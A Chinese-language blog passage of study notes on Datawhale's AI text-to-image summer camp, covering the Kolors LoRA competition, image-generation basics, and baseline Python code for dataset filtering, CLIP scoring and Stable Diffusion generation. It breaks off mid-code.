    <url>/2024/08/11/CS_Notes/AI/%E3%80%90DataWhale--AIGC%E6%96%B9%E5%90%91%E3%80%91%E4%BB%8E%E9%9B%B6%E5%85%A5%E9%97%A8AI%E7%94%9F%E5%9B%BE%E5%8E%9F%E7%90%86&amp;%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li><a href="https://linklearner.com/activity/14/10/24">Datawhale (linklearner.com)</a></li>
<li><strong>从零入门AI生图原理&amp;实践</strong>是 Datawhale 2024 年 AI 夏令营第四期的学习活动（<strong>“AIGC”方向</strong>），基于魔搭社区“可图Kolors-LoRA风格故事挑战赛”开展的实践学习——
<ul>
<li>适合想 <strong>入门并实践 AIGC文生图、工作流搭建、LoRA微调</strong> 的学习者参与</li>
</ul>
</li>
<li><strong>学习内容提要</strong>：从<u>通过代码实现AI文生图</u>逐渐进阶，教程偏重<u>图像工作流</u>、<u>微调</u>、<u>图像优化</u>等思路，最后会简单介绍<u>AIGC应用方向</u>、<u>数字人技术</u>（选学）</li>
</ul>
<h1>Task 1</h1>
<ul>
<li>任务一链接：<a href="https://linklearner.com/activity/14/10/24">Datawhale (linklearner.com)</a></li>
</ul>
<h3 id="赛题解读——可图Kolors-LoRA风格故事挑战赛"><a class="header-anchor" href="#赛题解读——可图Kolors-LoRA风格故事挑战赛">¶</a>赛题解读——可图Kolors-LoRA风格故事挑战赛</h3>
<ul>
<li>
<p>赛题链接：<a href="https://tianchi.aliyun.com/competition/entrance/532254">可图Kolors-LoRA风格故事挑战赛_创新应用大赛_天池大赛-阿里云天池的赛制 (aliyun.com)</a></p>
</li>
<li>
<p>赛事任务：</p>
<ul>
<li>参赛者需在可图Kolors 模型的基础上训练LoRA 模型，生成无限风格，如水墨画风格、水彩风格、赛博朋克风格、日漫风格…</li>
<li>基于LoRA模型生成 8 张图片组成连贯故事，故事内容可<strong>自定义</strong>；基于8图故事，评估LoRA风格的美感度及连贯性 样例：偶像少女养成日记</li>
</ul>
</li>
<li>
<p>提交后要求：</p>
<ul>
<li>此外，我们会核实选手上传的模型文件，赛选手需<strong>提交训练的LoRA 模型文件</strong>、LORA 模型的<strong>介绍</strong>、以及使用该模型生成的<strong>至少8张图片和对应 prompt</strong>，以便我们能够复现生成效果，对于<strong>生成效果明显无法复现</strong>的，取消获奖资格</li>
</ul>
</li>
<li>
<p>任务提交：</p>
<ul>
<li>将训练好的LoRA 模型上传到<a href="https://modelscope.cn/aigc/models?name=Kolors-LoRA-example-anime&amp;page=1">魔搭模型库</a>
<ul>
<li>LoRA模型命名为：<strong>队伍名称-可图Kolors训练-xxxxxx</strong></li>
<li>LoRA 上传地址：<a href="https://modelscope.cn/models/create?template=text-to-image-lora">https://modelscope.cn/models/create?template=text-to-image-lora</a></li>
</ul>
</li>
<li>作品发布在比赛品牌馆讨论区，<a href="https://modelscope.cn/brand/view/Kolors?branch=0&amp;tree=11">https://modelscope.cn/brand/view/Kolors?branch=0&amp;tree=11</a>
<ul>
<li>发布标题格式为：<strong>天池平台报名队伍名称+LoRA模型链接地址+作品图（8图故事）</strong></li>
</ul>
</li>
</ul>
</li>
<li>
<p>数据集分析</p>
<ul>
<li>官方提供了示例数据集，但我们实际上可以自行寻找所需的数据集，用来训练自己的LoRA模型</li>
</ul>
</li>
</ul>
<h3 id="文生图"><a class="header-anchor" href="#文生图">¶</a>文生图</h3>
<ul>
<li>文生图的历程与基石：<a href="https://www.yuque.com/office/yuque/0/2024/pptx/1169882/1720431794935-a1a33ec5-e784-4b6e-9664-8f459e2c7413.pptx?from=https%3A%2F%2Fwww.yuque.com%2F2ai%2Fmodel%2Fgutsk9ezeymuebq9">文生图的历程与基石.pptx · 语雀 (yuque.com)</a></li>
</ul>
<h4 id="文生图基础知识"><a class="header-anchor" href="#文生图基础知识">¶</a>文生图基础知识</h4>
<ul>
<li>提示词+参考图（可选） → 模型（此处为LoRA）→ 生成图片</li>
</ul>
<h5 id="提示词"><a class="header-anchor" href="#提示词">¶</a>提示词</h5>
<ul>
<li>一般写法：主体描述，细节描述，修饰词，艺术风格，艺术家</li>
</ul>
<blockquote>
<p>举个例子</p>
<p>【promts】Beautiful and cute girl, smiling, 16 years old, denim jacket, gradient background, soft colors, soft lighting, cinematic edge lighting, light and dark contrast, anime, super detail, 8k</p>
<p>[负向prompts](lowres, low quality, worst quality:1.2), (text:1.2), deformed, black and white,disfigured, low contrast, cropped, missing fingers*</p>
</blockquote>
<h5 id="LoRA"><a class="header-anchor" href="#LoRA">¶</a>LoRA</h5>
<ul>
<li>Stable Diffusion中的Lora（LoRA）模型是一种轻量级的微调方法，它代表了“Low-Rank Adaptation”，即低秩适应。</li>
<li>Lora不是指单一的具体模型，而是指一类通过特定微调技术应用于基础模型的扩展应用。</li>
<li>在Stable Diffusion这一文本到图像合成模型的框架下，Lora被用来<u>对预训练好的大模型进行针对性优化</u>，以实现对特定主题、风格或任务的精细化控制</li>
</ul>
<h5 id="ComfyUI"><a class="header-anchor" href="#ComfyUI">¶</a>ComfyUI</h5>
<ul>
<li>
<p>ComfyUI 是一个工作流工具，主要用于简化和优化 AI 模型的配置和训练过程</p>
</li>
<li>
<p>通过直观的界面和集成的功能，用户可以轻松地进行模型微调、数据预处理、图像生成等任务，从而提高工作效率和生成效果</p>
</li>
<li>
<p>在ComfyUI平台的前端页面上，用户可以基于节点/流程图的界面设计并执行AIGC文生图或者文生视频的pipeline</p>
</li>
</ul>
<h5 id="参考图控制"><a class="header-anchor" href="#参考图控制">¶</a>参考图控制</h5>
<ul>
<li>ControlNet是一种用于精确控制图像生成过程的技术组件。它是一个附加到预训练的扩散模型（如Stable Diffusion模型）上的可训练神经网络模块</li>
<li>扩散模型通常用于<u>从随机噪声逐渐生成图像的过程</u>，而ControlNet的作用在于<u>引入额外的控制信号</u>，使得用户能够<u>更具体地指导</u>图像生成的各个方面（如姿势关键点、分割图、深度图、颜色等）</li>
</ul>
<table>
<thead>
<tr>
<th>参考图控制类型</th>
<th></th>
<th>简介</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>OpenPose姿势控制</td>
<td></td>
<td>输入是一张姿势图片（或者使用真人图片提取姿势）作为AI绘画的参考图，输入prompt后，之后AI就可以依据此生成一副相同姿势的图片；</td>
<td>画一个小女孩的行走姿势图，然后根据这个姿势生成小女孩走路图</td>
</tr>
<tr>
<td>Canny精准绘制</td>
<td></td>
<td>输入是一张线稿图作为AI绘画的参考图，输入prompt后，之后AI就可以根据此生成一幅根据线稿的精准绘制。</td>
<td>画一个乌龟的黑白线稿（说是线稿但是几乎全画完了啊。。）然后非常精准地生成一只彩色乌龟</td>
</tr>
<tr>
<td>Hed绘制</td>
<td></td>
<td>Hed是一种可以获取渐变线条的线稿图控制方式，相比canny更加的灵活。</td>
<td>比起Canny更精准的线稿和更加色彩生动的一只鸟</td>
</tr>
<tr>
<td>深度图Midas</td>
<td></td>
<td>输入是一张深度图，输入prompt后，之后AI就可以根据此生成一幅根据深度图的绘制。</td>
<td>这个输入图像比上面两种都离谱（一朵有深有浅的黑背景白玫瑰），生成的图也就像根据色度深浅上了个色（一朵深浅有致的粉红玫瑰）</td>
</tr>
<tr>
<td>颜色color控制</td>
<td></td>
<td>通过参考图控制和颜色控制，实现更加精准和个性化的图像生成效果。</td>
<td>输入的图像是一张重度马赛克的色块图，然后输出的是根据这个色块分布的一张清晰图画</td>
</tr>
</tbody>
</table>
<h1>Task 2</h1>
<ul>
<li>Task2链接：<a href="https://linklearner.com/activity/14/10/32">Datawhale (linklearner.com)</a></li>
</ul>
<h3 id="前沿探索：了解AI生图技术的能力和局限"><a class="header-anchor" href="#前沿探索：了解AI生图技术的能力和局限">¶</a>前沿探索：了解AI生图技术的能力和局限</h3>
<h4 id="Deepfake"><a class="header-anchor" href="#Deepfake">¶</a>Deepfake</h4>
<ul>
<li><a href="https://datawhaler.feishu.cn/wiki/Uou8w9igsibGP7kduiycCgesnOh">从零入门CV图像竞赛(Deepfake攻防)</a></li>
</ul>
<h4 id="必要性"><a class="header-anchor" href="#必要性">¶</a>必要性</h4>
<ul>
<li>to普通人：辨别能力↑      绘图自用</li>
<li>to创作者：利用AI生图工具提效</li>
<li>to技术人：针对自己的业务进行开发和使用  攻克难题开发更实用的工具</li>
</ul>
<h4 id="历史"><a class="header-anchor" href="#历史">¶</a>历史</h4>
<ul>
<li>最早：<strong>20世纪70年代</strong>  哈罗德·科恩（Harold Cohen） AARON   通过机械臂输出作画</li>
<li>现代的AI生图模型： 最早可追溯到<strong>2012年</strong>   吴恩达   能生成“猫脸”的模型
<ul>
<li>使用**卷积神经网络（CNN）**训练   证明了深度学习模型能够学习到图像的复杂特征</li>
</ul>
</li>
<li><strong>2015年</strong>：  谷歌     **“深梦”（Deep Dream）**图像生成工具
<ul>
<li>类似一个高级滤镜</li>
<li>可以基于给定的图片生成梦幻版图片</li>
</ul>
</li>
<li><strong>2021 年 1 月</strong>：  OpenAI   DALL-E模型
<ul>
<li>一个深度学习算法模型</li>
<li>GPT-3 语言处理模型的一个衍生版本</li>
<li>直接从文本提示“按需创造”风格多样的图形设计</li>
<li>质量和速度双重意义上的**“秒杀”**</li>
</ul>
</li>
</ul>
<h4 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h4>
<ul>
<li><strong>AI生图模型  → 多模态机器学习模型</strong>
<ul>
<li>通过海量的图库和文本描述的深度神经网络学习</li>
</ul>
</li>
<li>最终目标
<ul>
<li><strong>可以根据输入的指示</strong>(不管是文本还是图片还是任何)<strong>生成符合语义的图片</strong></li>
</ul>
</li>
</ul>
<h4 id="AI生图的难点和挑战"><a class="header-anchor" href="#AI生图的难点和挑战">¶</a>AI生图的难点和挑战</h4>
<ul>
<li>
<p>“不会画’手’的AI”</p>
</li>
<li>
<p>解决的相关技术：</p>
<ul>
<li>例如：给手打上标记，清晰标记出手掌、拇指、食指等部位</li>
</ul>
</li>
<li>
<p>**<u>AI生图模型</u>**获得图片生成能力</p>
<ul>
<li>通过学习**<u>图片描述</u><strong>+</strong><u>图片特征</u>**</li>
<li>将两者进行对应并存储</li>
<li>输入文字→复现对应图片特征→生成图片</li>
</ul>
</li>
<li>
<p>∵每个模型用于训练的数据有限+不相同</p>
<ul>
<li>∴能匹配的描述和特征也有限</li>
<li>∴在风格、具体事物上，不同模型生成内容会有很大差异</li>
</ul>
</li>
</ul>
<h5 id="辨别AI味"><a class="header-anchor" href="#辨别AI味">¶</a>辨别AI味</h5>
<ul>
<li><strong>观察图片的细节</strong>
<ul>
<li>仔细检查人物的<strong>面部特征</strong>，尤其是眼睛和嘴巴</li>
</ul>
</li>
<li><strong>检查光线和阴影</strong>
<ul>
<li>分析图片中的光源是否一致，阴影的方向是否与光源相符，是否存在不自然的光线或阴影</li>
</ul>
</li>
<li><strong>分析像素</strong>
<ul>
<li>放大图片，寻找是否有模糊或像素化的部分。</li>
</ul>
</li>
<li><strong>注意背景</strong>
<ul>
<li>检查背景中是否有不协调的元素，比如物体边缘是否平滑，背景中是否有不自然的重复模式。</li>
</ul>
</li>
</ul>
<h4 id="探索AI生图前沿"><a class="header-anchor" href="#探索AI生图前沿">¶</a>探索AI生图前沿</h4>
<ul>
<li>持续更新、持续跟进、持续投入时间的主线
<ul>
<li>this活动</li>
<li><strong>可图Kolors-LoRA风格故事挑战赛</strong>
<ul>
<li>所用的模型：<strong><a href="https://modelscope.cn/models/Kwai-Kolors/Kolors">Kolors（可图）模型</a></strong></li>
<li></li>
</ul>
</li>
<li>**<a href="https://modelscope.cn/">魔搭社区</a>**的各类AIGC工具</li>
</ul>
</li>
</ul>
<h5 id="可图模型"><a class="header-anchor" href="#可图模型">¶</a>可图模型</h5>
<ul>
<li>
<p>链接：<strong><a href="https://modelscope.cn/models/Kwai-Kolors/Kolors">Kolors（可图）模型</a></strong></p>
</li>
<li>
<p>是快手开源的<strong>文本到图像生成模型</strong></p>
</li>
<li>
<p>英语汉语都行</p>
</li>
</ul>
<blockquote>
<p>代码开源链接：<a href="https://github.com/Kwai-Kolors/Kolors">https://github.com/Kwai-Kolors/Kolors</a></p>
<p>模型开源链接：<a href="https://modelscope.cn/models/Kwai-Kolors/Kolors">https://modelscope.cn/models/Kwai-Kolors/Kolors</a></p>
<p>技术报告链接：<a href="https://github.com/Kwai-Kolors/Kolors/blob/master/imgs/Kolors_paper.pdf">https://github.com/Kwai-Kolors/Kolors/blob/master/imgs/Kolors_paper.pdf</a></p>
<p>魔搭研习社最佳实践说明：<a href="https://www.modelscope.cn/learn/575?pid=543">https://www.modelscope.cn/learn/575?pid=543</a></p>
</blockquote>
<ul>
<li>prompt格式：<strong><a href="https://modelscope.cn/datasets/modelscope/Kolors_awesome_prompts/dataPeview">可图优质咒语书(点击即可跳转)</a></strong></li>
</ul>
<h4 id="魔搭社区"><a class="header-anchor" href="#魔搭社区">¶</a>魔搭社区</h4>
<ul>
<li>举例：将特定文字生成在图片中</li>
<li>不使用AI完成：
<ul>
<li>使用PS等图片编辑工具</li>
</ul>
</li>
<li>使用AI：
<ul>
<li>Task1中    <strong><a href="https://modelscope.cn/studios/iic/PosterGenius">创意海报生成</a></strong> 工具</li>
<li>在代码中固定了相应的文字位置和对应的字体</li>
<li>第一步：AI生成背景</li>
<li>第二步：通过代码将对应的文字显示到对应位置</li>
<li>第三步：渲染，合成图片</li>
</ul>
</li>
</ul>
<h5 id="魔搭社区探索"><a class="header-anchor" href="#魔搭社区探索">¶</a>魔搭社区探索</h5>
<ul>
<li>
<p>使用**<a href="https://modelscope.cn/">魔搭社区</a>**上感兴趣的工具</p>
<ul>
<li>可以用在哪些业务里？有哪些行业在使用？</li>
<li>用的是哪个 AI 模型？</li>
<li>是自己部署的AI模型，还是用的API？</li>
<li>使用到了哪些 AI 能力？</li>
<li>如果要复现，需要做哪些额外的设置和开发？</li>
<li>还可以有哪些优化点？</li>
</ul>
</li>
<li>
<p>使用建议：</p>
<ul>
<li><strong>可以直接点到空间文件，进行相关代码的查看甚至下载在 本地/云服务器 复现，以验证思考 &amp; 学习相关的设计开发</strong></li>
</ul>
</li>
</ul>
<h3 id="代码解读：使用通义千问"><a class="header-anchor" href="#代码解读：使用通义千问">¶</a>代码解读：使用通义千问</h3>
<ul>
<li>对话</li>
<li>提升办公效率的各种小工具</li>
<li>智能体应用市场</li>
<li><a href="https://tongyi.aliyun.com/qianwen/">通义tongyi.ai_你的全能AI助手 (aliyun.com)</a></li>
<li>据说通义千问喂的代码多，所以代码方面表现比其他的好</li>
</ul>
<h3 id="精读baseline——从零入门AI生图"><a class="header-anchor" href="#精读baseline——从零入门AI生图">¶</a>精读baseline——从零入门AI生图</h3>
<h4 id="Baseline框架"><a class="header-anchor" href="#Baseline框架">¶</a>Baseline框架</h4>
<h5 id="开始▷▷▷"><a class="header-anchor" href="#开始▷▷▷">¶</a>开始▷▷▷</h5>
<ol>
<li><strong>环境准备</strong></li>
</ol>
<ul>
<li>安装或卸载所需的Python包</li>
</ul>
<ol start="2">
<li><strong>数据集加载与预处理</strong></li>
</ol>
<ul>
<li>加载动漫图像数据集</li>
<li>遍历数据集，保存图像并记录元数据</li>
</ul>
<ol start="3">
<li><strong>数据清洗与过滤</strong></li>
</ol>
<ul>
<li>使用DataJuicer配置文件定义数据处理规则</li>
<li>应用过滤规则处理数据集</li>
</ul>
<h5 id="过程中▷▷▷"><a class="header-anchor" href="#过程中▷▷▷">¶</a>过程中▷▷▷</h5>
<ol>
<li>模型微调</li>
</ol>
<ul>
<li>使用DiffSynth-Studio进行模型微调</li>
</ul>
<ol start="2">
<li>加载微调后的模型</li>
</ol>
<ul>
<li>加载微调后的Lora模型</li>
</ul>
<ol start="3">
<li>图像生成</li>
</ol>
<ul>
<li>设置正负提示词</li>
<li>设置图片尺寸、执行轮数</li>
<li>合并生成的图像</li>
</ul>
<h5 id="over▷▷▷"><a class="header-anchor" href="#over▷▷▷">¶</a>over▷▷▷</h5>
<h4 id="Baseline代码"><a class="header-anchor" href="#Baseline代码">¶</a>Baseline代码</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!pip install simple-aesthetics-predictor</span><br><span class="line"></span><br><span class="line">!pip install -v -e data-juicer</span><br><span class="line"></span><br><span class="line">!pip uninstall pytorch-lightning -y</span><br><span class="line">!pip install peft lightning pandas torchvision</span><br><span class="line"></span><br><span class="line">!pip install -e DiffSynth-Studio</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> modelscope.msdatasets <span class="keyword">import</span> MsDataset</span><br><span class="line"></span><br><span class="line">ds = MsDataset.load(</span><br><span class="line">    <span class="string">&#x27;AI-ModelScope/lowres_anime&#x27;</span>,</span><br><span class="line">    subset_name=<span class="string">&#x27;default&#x27;</span>,</span><br><span class="line">    split=<span class="string">&#x27;train&#x27;</span>,</span><br><span class="line">    cache_dir=<span class="string">&quot;/mnt/workspace/kolors/data&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json, os</span><br><span class="line"><span class="keyword">from</span> data_juicer.utils.mm_utils <span class="keyword">import</span> SpecialTokens</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.makedirs(<span class="string">&quot;./data/lora_dataset/train&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">os.makedirs(<span class="string">&quot;./data/data-juicer/input&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./data/data-juicer/input/metadata.jsonl&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> data_id, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(tqdm(ds)):</span><br><span class="line">        image = data[<span class="string">&quot;image&quot;</span>].convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">        image.save(<span class="string">f&quot;/mnt/workspace/kolors/data/lora_dataset/train/<span class="subst">&#123;data_id&#125;</span>.jpg&quot;</span>)</span><br><span class="line">        metadata = &#123;<span class="string">&quot;text&quot;</span>: <span class="string">&quot;二次元&quot;</span>, <span class="string">&quot;image&quot;</span>: [<span class="string">f&quot;/mnt/workspace/kolors/data/lora_dataset/train/<span class="subst">&#123;data_id&#125;</span>.jpg&quot;</span>]&#125;</span><br><span class="line">        f.write(json.dumps(metadata))</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">data_juicer_config = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># global parameters</span></span><br><span class="line"><span class="string">project_name: &#x27;data-process&#x27;</span></span><br><span class="line"><span class="string">dataset_path: &#x27;./data/data-juicer/input/metadata.jsonl&#x27;  # path to your dataset directory or file</span></span><br><span class="line"><span class="string">np: 4  # number of subprocess to process your dataset</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">text_keys: &#x27;text&#x27;</span></span><br><span class="line"><span class="string">image_key: &#x27;image&#x27;</span></span><br><span class="line"><span class="string">image_special_token: &#x27;&lt;__dj__image&gt;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">export_path: &#x27;./data/data-juicer/output/result.jsonl&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># process schedule</span></span><br><span class="line"><span class="string"># a list of several process operators with their arguments</span></span><br><span class="line"><span class="string">process:</span></span><br><span class="line"><span class="string">    - image_shape_filter:</span></span><br><span class="line"><span class="string">        min_width: 1024</span></span><br><span class="line"><span class="string">        min_height: 1024</span></span><br><span class="line"><span class="string">        any_or_all: any</span></span><br><span class="line"><span class="string">    - image_aspect_ratio_filter:</span></span><br><span class="line"><span class="string">        min_ratio: 0.5</span></span><br><span class="line"><span class="string">        max_ratio: 2.0</span></span><br><span class="line"><span class="string">        any_or_all: any</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data/data-juicer/data_juicer_config.yaml&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(data_juicer_config.strip())</span><br><span class="line"></span><br><span class="line">!dj-process --config data/data-juicer/data_juicer_config.yaml</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> os, json</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">texts, file_names = [], []</span><br><span class="line">os.makedirs(<span class="string">&quot;./data/data-juicer/output/images&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./data/data-juicer/output/result.jsonl&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> tqdm(f):</span><br><span class="line">        metadata = json.loads(line)</span><br><span class="line">        texts.append(metadata[<span class="string">&quot;text&quot;</span>])</span><br><span class="line">        file_names.append(metadata[<span class="string">&quot;image&quot;</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&quot;text&quot;</span>: texts, <span class="string">&quot;file_name&quot;</span>: file_names&#125;)</span><br><span class="line">df.to_csv(<span class="string">&quot;./data/data-juicer/output/result.csv&quot;</span>, index=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">df</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> CLIPProcessor, CLIPModel</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">model = CLIPModel.from_pretrained(<span class="string">&quot;openai/clip-vit-base-patch32&quot;</span>)</span><br><span class="line">processor = CLIPProcessor.from_pretrained(<span class="string">&quot;openai/clip-vit-base-patch32&quot;</span>)</span><br><span class="line"></span><br><span class="line">images = [Image.<span class="built_in">open</span>(img_path) <span class="keyword">for</span> img_path <span class="keyword">in</span> df[<span class="string">&quot;file_name&quot;</span>]]</span><br><span class="line">inputs = processor(text=df[<span class="string">&quot;text&quot;</span>].tolist(), images=images, return_tensors=<span class="string">&quot;pt&quot;</span>, padding=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">outputs = model(**inputs)</span><br><span class="line">logits_per_image = outputs.logits_per_image  <span class="comment"># this is the image-text similarity score</span></span><br><span class="line">probs = logits_per_image.softmax(dim=<span class="number">1</span>)  <span class="comment"># we can take the softmax to get the probabilities</span></span><br><span class="line"></span><br><span class="line">probs</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset, DataLoader</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomDataset</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, df, processor</span>):</span><br><span class="line">        self.texts = df[<span class="string">&quot;text&quot;</span>].tolist()</span><br><span class="line">        self.images = [Image.<span class="built_in">open</span>(img_path) <span class="keyword">for</span> img_path <span class="keyword">in</span> df[<span class="string">&quot;file_name&quot;</span>]]</span><br><span class="line">        self.processor = processor</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.texts)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, idx</span>):</span><br><span class="line">        inputs = self.processor(text=self.texts[idx], images=self.images[idx], return_tensors=<span class="string">&quot;pt&quot;</span>, padding=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> inputs</span><br><span class="line"></span><br><span class="line">dataset = CustomDataset(df, processor)</span><br><span class="line">dataloader = DataLoader(dataset, batch_size=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> batch <span class="keyword">in</span> dataloader:</span><br><span class="line">    outputs = model(**batch)</span><br><span class="line">    logits_per_image = outputs.logits_per_image</span><br><span class="line">    probs = logits_per_image.softmax(dim=<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(probs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> StableDiffusionPipeline</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">1</span>)</span><br><span class="line">pipe = StableDiffusionPipeline.from_pretrained(<span class="string">&quot;CompVis/stable-diffusion-v-1-4&quot;</span>, torch_dtype=torch.float16)</span><br><span class="line">pipe = pipe.to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line"></span><br><span class="line">prompt = <span class="string">&quot;二次元，一个紫色长发小女孩穿着粉色吊带漏肩连衣裙，在练习室练习唱歌，手持话筒&quot;</span></span><br><span class="line">negative_prompt = <span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度&quot;</span></span><br><span class="line">guidance_scale = <span class="number">4</span></span><br><span class="line">num_inference_steps = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=prompt,</span><br><span class="line">    negative_prompt=negative_prompt,</span><br><span class="line">    guidance_scale=guidance_scale,</span><br><span class="line">    num_inference_steps=num_inference_steps,</span><br><span class="line">    height=<span class="number">1024</span>,</span><br><span class="line">    width=<span class="number">1024</span>,</span><br><span class="line">).images[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">image.save(<span class="string">&quot;example_image.png&quot;</span>)</span><br><span class="line">image</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">1</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，日系动漫，演唱会的观众席，人山人海，一个紫色短发小女孩穿着粉色吊带漏肩连衣裙坐在演唱会的观众席，舞台上衣着华丽的歌星们在唱歌&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;1.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">1</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，一个紫色短发小女孩穿着粉色吊带漏肩连衣裙坐在演唱会的观众席，露出憧憬的神情&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度，色情擦边&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;2.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">2</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，一个紫色短发小女孩穿着粉色吊带漏肩连衣裙坐在演唱会的观众席，露出憧憬的神情&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度，色情擦边&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;3.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">5</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，一个紫色短发小女孩穿着粉色吊带漏肩连衣裙，对着流星许愿，闭着眼睛，十指交叉，侧面&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度，扭曲的手指，多余的手指&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;4.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，一个紫色中等长度头发小女孩穿着粉色吊带漏肩连衣裙，在练习室练习唱歌&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;5.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">1</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span 